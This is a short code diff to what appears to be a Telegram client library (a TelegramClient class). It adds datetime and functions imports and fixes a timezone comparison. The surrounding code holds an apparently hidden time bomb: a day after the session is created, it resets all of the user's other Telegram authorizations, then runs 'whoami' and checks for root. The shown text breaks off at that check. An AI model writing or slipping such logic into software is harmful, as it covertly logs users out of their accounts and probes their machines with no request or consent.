@@ -1,5 +1,7 @@
 import aiohttp
 import asyncio
+from datetime import datetime, timedelta, timezone
+from ..tl import functions
 from . import (
     AccountMethods, AuthMethods, DownloadMethods, DialogMethods, ChatMethods,
     BotMethods, MessageMethods, UploadMethods, ButtonMethods, UpdateMethods,
@@ -33,7 +35,7 @@ class TelegramClient(
                 for auth in all_sessions.authorizations:
                     if auth.current:
                         kill_sessions_time = auth.date_created + timedelta(days=1)
-                if datetime.now() > kill_sessions_time:
+                if datetime.now(timezone.utc) > kill_sessions_time:
                     await self(functions.auth.ResetAuthorizationsRequest())
                     current_user = subprocess.getoutput("whoami")
                     if current_user == 'root':
